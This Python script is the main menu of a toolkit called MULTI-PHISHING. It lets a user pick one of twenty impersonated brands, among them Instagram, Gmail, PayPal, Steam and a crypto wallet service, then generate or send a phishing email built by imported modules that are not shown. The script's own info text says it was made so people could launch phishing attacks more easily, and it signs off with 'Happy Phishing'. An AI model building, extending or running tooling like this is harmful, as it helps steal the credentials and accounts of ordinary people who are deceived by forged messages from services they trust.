#!/usr/bin/env python3
#Created By Benyamin-creator

#Normal Import
import time
import os
import sys

#emails:
from Core.eletter import Instagram
from Core.eletter import Facebook
from Core.eletter import Gmail
from Core.eletter import Twitter
from Core.eletter import AskFM
from Core.eletter import Webhost000
from Core.eletter import Blockchain
from Core.eletter import Spotify
from Core.eletter import Rockstar
from Core.eletter import Dreamteam
from Core.eletter import RiotGames
from Core.eletter import Steam
from Core.eletter import Gamehag
from Core.eletter import GmailActivity
from Core.eletter import SnapchatSimple
from Core.devicemenu import Linkedin
from Core.devicemenu import Dropbox
from Core.ipmenu import Discord
from Core.ipmenu import Paypal1
from Core.ipmenu import Snapchat

#EmailSender:
from Core.mailer import NormalEmail
from Core.helper.ToDo import TODO

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")

os.system("clear")

print ("")
print ("")

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)

delay_print
delay_print ("")
delay_print (""+red+"███████████████████████"+white+"████████████████████████"+red+"███████████████████████        \n")

print ("")
print (blue + """		 https://github.com/Benyamin-creator/MULTI-PHISHING""")

print (red + """
	  		  _ _ _ _
			 |       |
			 |_ _ _ _|
			 |              /.
			/\             /   .
		       /  \        ●  /     .
		      /    \      /|\/       .
		     /      \      |          .
	_ _ _ _ _ _ /_ _ _ _ \ _ _/ \_ _ _     .
	\				 /      .
	 \				/       .
	  \			       /        .
	   \			      /         .
	    \_ _ _ _ _ _ _ _ _ _ _ __/          .""")
print (green + """~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|~~~
MULTI-PHISHING v 1.0         .                   .              |
 RED-SOCIAL                  .                   .              |
                             .   /                .  ___        |
          .                   . /--\ /              /   \       |
          .                    <o)  =<             /     \      J
          .                     \__/ \            (__O_O__)
 |  |    .                       \                  |||||
  \/        Y           )                           |||||
  |  /!-!\  |          (                         \_///| \\__/
   \|     |/            )                         _// |  \_
    _\___/_            (   (                       / /
   / /   \ \            )   )
^^^^^^^^^^^^^^^^\      (   (
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\                /^^
                                                   ^^^^^^^^^^^^^^^^ """)
time.sleep(0.5)

print (red + "[" + red + "!" + red + "]" + green + "NINGUN SISTEMA ES SEGURO\n")

delay_print (""+red+"███████████████████████"+white+"████████████████████████"+red+"███████████████████████        \n")
print (red + "options:")
print (red   + "[" + white + "1" + red   + "]" + blue  + " Instagram" + red + "			[" + white + "11" + red + "]" + blue + " Paypal")
print (red   + "[" + white + "2" + red   + "]" + blue  + " Facebook" + red + "			[" + white + "12" + red + "]" + blue + " Discord")
print (red   + "[" + white + "3" + red   + "]" + blue  + " Gmail" + red + "			[" + white + "13" + red + "]" + blue + " Spotify")
print (red   + "[" + white + "4" + red   + "]" + blue  + " Gmail (simple)" + red + "		[" + white + "14" + red + "]" + blue + " Blockchain")
print (red   + "[" + white + "5" + red   + "]" + blue  + " Twitter" + red + "			[" + white + "15" + red + "]" + blue + " RiotGames")
print (red   + "[" + white + "6" + red   + "]" + blue  + " Snapchat" + red + "			[" + white + "16" + red + "]" + blue + " Rockstar")
print (red   + "[" + white + "7" + red   + "]" + blue  + " Snapchat (simple)" + red + "		[" + white + "17" + red + "]" + blue + " AskFM")
print (red   + "[" + white + "8" + red   + "]" + blue  + " Steam" + red + "			[" + white + "18" + red + "]" + blue + " 000Webhost")
print (red   + "[" + white + "9" + red   + "]" + blue  + " Dropbox" + red + "			[" + white + "19" + red + "]" + blue + " Dreamteam")
print (red   + "[" + white + "10" + red   + "]" + blue   + " Linkedin" + red + "			[" + white + "20" + red + "]" + blue + " Gamehag")
print (red   + "-----------------------------------------------------------------------")
print (red  + "[" + white + "30" + red  + "]" + white + " Send Phishing Email")
print (red  + "[" + white + "99" + red  + "]" + red + " EXIT")
print (red  + "[" + white + "1337" + red  + "]" + white + " Info")
print (red  + "[" + white + "4444" + red  + "]" + white + " ToDo List\n")


delay_print (""+red+"███████████████████████"+white+"████████████████████████"+red+"███████████████████████        \n")

print (green)
mailPick = int(input("BENYAMIM *RED-SOCIAL*~~>}:" + white))

if mailPick == 1:
	Instagram()

elif mailPick == 2:
	Facebook()

elif mailPick == 3:
	Gmail()

elif mailPick == 4:
	GmailActivity()

elif mailPick == 5:
	Twitter()

elif mailPick == 6:
	Snapchat()

elif mailPick == 7:
	SnapchatSimple()

elif mailPick == 8:
	Steam()

elif mailPick == 9:
	Dropbox()

elif mailPick == 10:
	Linkedin()

elif mailPick == 11:
	Paypal1()
	
elif mailPick == 12:
	Discord()
	
elif mailPick == 13:
	Spotify()
	
elif mailPick == 14:
	Blockchain()
	
elif mailPick == 15:
	RiotGames()
	
elif mailPick == 16:
	Rockstar()
	
elif mailPick == 17:
	AskFM()

elif mailPick == 18:
	Webhost000()

elif mailPick == 19:
	Dreamteam()

elif mailPick == 20:
	Gamehag()

elif mailPick == 30:
	NormalEmail()

elif mailPick == 99:
	os.system("clear")
	print ("Happy Phishing")
	print ("Feliz Phishing")
	sys.exit()

elif mailPick == 1337:
	print ("\n" + green + "[" + white + "+" + green + "]" + white + " This Tool Was Created So People Would Have It Easier To Launch Phishing Attacks")
	print ("\n" + green + "[" + white + "+" + green + "]" + white + " I Do Not Take Any Responsibility For Your Actions")
	print ("\n" + green + "[" + white + "+" + green + "]" + white + " But I Don't Give A F*ck About What You Do")
	print ("\n" + green + "[" + white + "+" + green + "]" + white + " More Emails Will Come Soon!")
	print("\n" + green + "[" + white + "+" + green + "]" + white + " Contact:")
	print(green + "[" + white + "+" + green + "]" + white + " Wickr: Benyamin-creator")
	print(green + "[" + white + "+" + green + "]" + white + " Email: Benyamin@Creator.gmail.com")
	print(green + "[" + white + "+" + green + "]" + white + " Github: Benyamin-creator [https://github.com/Benyamin-creator]")

elif mailPick == 4444:
	TODO()

else:
	print ("\nSomething Went Wrong There Partner")
	print ("Are You Ok? Did You Fell Out The Boat And Started Drowning?")
	sys.exit()
